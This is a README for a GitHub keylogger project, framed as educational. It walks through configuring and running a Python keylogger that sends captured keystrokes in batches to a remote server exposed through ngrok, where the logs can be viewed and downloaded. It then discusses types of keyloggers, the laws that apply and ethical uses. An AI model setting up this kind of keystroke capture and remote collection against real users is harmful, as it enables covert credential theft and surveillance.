# Keylogger :)

<!-- COUNTER -->
Counter: 1
<!-- /COUNTER -->

[![Contributors](https://img.shields.io/github/contributors/Stalin-143/Keylogger?style=for-the-badge)](https://github.com/Stalin-143/Keylogger/graphs/contributors)

![WhatsApp Image 2024-11-29 at 11 35 30 PM](https://github.com/user-attachments/assets/689d466c-26d5-4830-8dba-48693ea04d01)

## Introduction

Welcome to the **Keylogger Project**! This project demonstrates how a keylogger operates. Keyloggers are tools that can record keystrokes made on a computer or device, capturing everything from passwords to personal messages. While they can be used for legitimate purposes, they are also often used by malicious actors for cybercrime.

⚠️ **IMPORTANT**: This project is for **educational purposes only**. Unauthorized use of keyloggers is illegal and punishable by law.

## 📂 Project Structure

```
/keylogger-project
├── /src                    # Source code
│   ├── keylogger.py        # Main keylogger script
│   └── server.py           # Web server for viewing logs
├── /config                 # Configuration files
│   ├── config.json.example # Configuration template
│   └── .env.example        # Environment variables template
├── /logs                   # Log files directory (created automatically)
├── /docs                   # Documentation
│   └── manual.sh           # Educational information script
├── /scripts                # Utility scripts
│   └── create-release.sh   # Script to create releases
├── /github                 # GitHub workflows and configs
├── setup.sh                # Setup script
├── requirements.txt        # Python dependencies
├── README.md               # This file
├── LICENSE                 # License information
├── SECURITY.md             # Security policy
├── DISCLAIMER.md           # Legal disclaimer
└── CONTRIBUTORS.md         # Contributors list
```

## 🚀 Quick Start

### Prerequisites

- Python 3.7 or higher
- pip (Python package manager)
- ngrok (for exposing the web server, optional)

### Installation

1. **Clone the repository**
   ```bash
   git clone https://github.com/Stalin-143/Keylogger.git
   cd Keylogger
   ```

2. **Run the setup script**
   ```bash
   ./setup.sh
   ```
   
   This will:
   - Check for Python installation
   - Optionally create a virtual environment
   - Install required dependencies
   - Set up configuration files

3. **Configure the application**
   
   Edit `config/config.json`:
   ```json
   {
       "keylogger": {
           "log_file_path": "logs/keylog.txt",
           "batch_size": 10,
           "server_url": "https://your-ngrok-url.ngrok-free.app"
       },
       "web_server": {
           "log_file_path": "logs/keylog.txt",
           "host": "0.0.0.0",
           "port": 5000,
           "debug": false
       }
   }
   ```

4. **Set up authentication**
   
   Edit `config/.env`:
   ```bash
   WEB_SERVER_USERNAME=admin_user
   WEB_SERVER_PASSWORD=your_very_strong_password_here
   FLASK_DEBUG=False
   LOG_INGEST_API_KEY=replace_with_random_long_api_key
   ```

### Usage

#### 1. Start the Web Server

```bash
# Using default configuration
python3 src/server.py

# Using custom configuration
python3 src/server.py --config config/config.json --port 8080

# Load environment variables
source config/.env  # or use 'export' for each variable
python3 src/server.py
```

The web server will start and be accessible at `http://localhost:5000` (or your configured port).

#### 2. (Optional) Expose Server with ngrok

If you want to access the server remotely:

```bash
# Install ngrok from https://ngrok.com/download
ngrok http 5000
```

Copy the ngrok URL (e.g., `https://xxxx-xxxx.ngrok-free.app`) and update it in `config/config.json`.

#### 3. Run the Keylogger

```bash
# Using default configuration
python3 src/keylogger.py

# Using custom configuration
python3 src/keylogger.py --config config/config.json

# With command-line overrides
python3 src/keylogger.py --server-url https://your-ngrok-url.ngrok-free.app --log-file logs/custom.txt
```

Press **ESC** to stop the keylogger.

#### 4. View Logs

Open your browser and navigate to:
- Local: `http://localhost:5000`
- Remote: `https://your-ngrok-url.ngrok-free.app`

Login with your configured credentials and view/download the logs.

## 📖 What is a Keylogger?

A **Keylogger** is a software or hardware tool designed to record every keystroke made by a user on a computer or device. It can capture sensitive information such as:

- **Usernames**
- **Passwords**
- **Credit card information**
- **Private messages**

Keyloggers are typically used by attackers to steal personal data or spy on users without their knowledge.

## 🔍 Types of Keyloggers

There are two main types of keyloggers:

1. **Software Keyloggers**: These run in the background on a computer, recording keystrokes and often sending the data to an attacker remotely.
2. **Hardware Keyloggers**: These are physical devices that are plugged into a computer between the keyboard and the computer. They can capture keystrokes without needing software.

## 🎯 Why Hackers Use Keyloggers

Hackers use keyloggers for several reasons:

1. **Stealing Personal Information**: Keyloggers can capture sensitive information such as usernames, passwords, and bank details.
2. **Credential Harvesting**: Attackers can use keyloggers to gather login credentials for unauthorized access.
3. **Spyware**: Keyloggers allow hackers to secretly monitor a user's activity without their consent.
4. **Social Engineering**: Keyloggers help attackers gather information to manipulate targets.
5. **Advanced Persistent Threats (APTs)**: Keyloggers are used as part of long-term cyberattacks to monitor and steal sensitive data.

## ⚙️ Keylogger Features

- **Configuration Management**: Use JSON config files and environment variables
- **Command-line Interface**: Flexible CLI with argument parsing
- **Batch Processing**: Send logs in batches to reduce network overhead
- **Error Handling**: Robust error handling and logging
- **Web Interface**: View and download logs through a secure web interface
- **Basic Authentication**: Password-protected web interface

## ⚖️ Legal Implications of Keyloggers

Using keyloggers for malicious purposes is **illegal** in most countries. Keyloggers are often used in **cybercrime** and **identity theft**. Here are some of the key laws regarding keyloggers:

- **Computer Fraud and Abuse Act (CFAA)** in the U.S. makes unauthorized access to computer systems illegal.
- **Wiretap Act** criminalizes intercepting communications without consent.
- **General Data Protection Regulation (GDPR)** in Europe requires explicit consent to collect personal data.
- **Cybersecurity Laws** in many countries make hacking, data theft, and unauthorized surveillance punishable by law.

### Consequences of Using Keyloggers Illegally:

- **Imprisonment**: In many jurisdictions, unauthorized use of keyloggers can result in severe criminal charges.
- **Fines**: Convicted individuals may face hefty fines, especially if the data stolen is used for financial gain.
- **Reputational Damage**: Being caught using a keylogger illegally can lead to significant harm to one's reputation.

## 🛡️ Ethical Considerations

While keyloggers are often associated with malicious hacking, they can have legitimate uses:

1. **Parental Control**: Parents use keyloggers to monitor their children's online activities.
2. **Employee Monitoring**: Employers may monitor their employees to ensure compliance with company policies.
3. **Security Testing**: Ethical hackers use keyloggers as part of penetration testing to identify vulnerabilities.

It is essential that **explicit consent** is obtained before using keyloggers for any purpose. Always ensure compliance with local laws and ethical guidelines.

## 🔐 Keylogger in Cybersecurity

In the realm of **ethical hacking** and **penetration testing**, keyloggers are used to test the security of a system. Ethical hackers might deploy keyloggers as part of a broader security assessment. The goal is to discover vulnerabilities in a system and ensure sensitive data is protected.

### Ethical Use Cases:

- **Penetration Testing**: Keyloggers help identify security weaknesses and prevent future breaches.
- **System Auditing**: Businesses can use keyloggers to monitor user behavior and detect malicious activities.

## 🔒 Privacy and Security Risks

Keyloggers pose significant risks to privacy and security:

- **Privacy Violations**: Keyloggers record everything typed, exposing personal data to unauthorized parties.
- **Identity Theft**: If hackers steal login credentials or other personal information, it can lead to identity theft or financial fraud.
- **Cyberattacks**: Keyloggers can be used as part of larger **phishing** or **malware** attacks.

## 🛠️ Development

### Requirements

- Python 3.7+
- Flask 2.2.5
- pynput 1.7.6
- requests 2.32.4

### Project Structure

The project follows a modular structure:
- `/src` - Contains the main application code
- `/config` - Configuration files and templates
- `/logs` - Log files (auto-created, git-ignored)
- `/docs` - Documentation and educational materials

### Contributing

Contributions are welcome! Please make sure to follow ethical guidelines and legal standards when contributing to this project.

See our [Contributors Hall of Fame](CONTRIBUTORS.md) to view all the amazing people who have contributed to this project! ✨

### Creating Releases

Releases can be created in three ways:

1. **Using the release script** (recommended):
   ```bash
   ./scripts/create-release.sh
   # Or with a specific version:
   ./scripts/create-release.sh v1.0.0
   ```
   This interactive script validates the version, creates a tag, and pushes it.

2. **Using Git tags**:
   ```bash
   git tag -a v1.0.0 -m "Release v1.0.0"
   git push origin v1.0.0
   ```
   This automatically triggers the release workflow.

3. **Manual workflow dispatch**:
   - Go to Actions → Create Release
   - Click "Run workflow"
   - Enter the version (e.g., `v1.0.0`)

See [CHANGELOG.md](CHANGELOG.md) for version history.

## 📜 License

This project is licensed under the [License](LICENSE)

## ⚠️ Legal Disclaimer

This project is intended for **educational purposes** only. Unauthorized use of keyloggers for malicious activities is illegal and punishable by law. Always obtain explicit consent before deploying monitoring tools and ensure compliance with local and international laws.

**Disclaimer**: This project is intended for educational purposes only. Unauthorized use of keyloggers is illegal.

## 🆘 Support

If you encounter any issues or have questions:

1. Check the [SECURITY.md](SECURITY.md) for security-related concerns
2. Read the [DISCLAIMER.md](DISCLAIMER.md) for legal information
3. Open an issue on GitHub

## 📚 Resources

- GitHub Repository: [Stalin-143](https://github.com/Stalin-143)
- Educational Script: Run `./docs/manual.sh` for detailed information
- Related Articles on Ethical Hacking and Cybersecurity

**Remember**: Always use this tool responsibly and ethically. Obtain proper authorization before using any monitoring software.
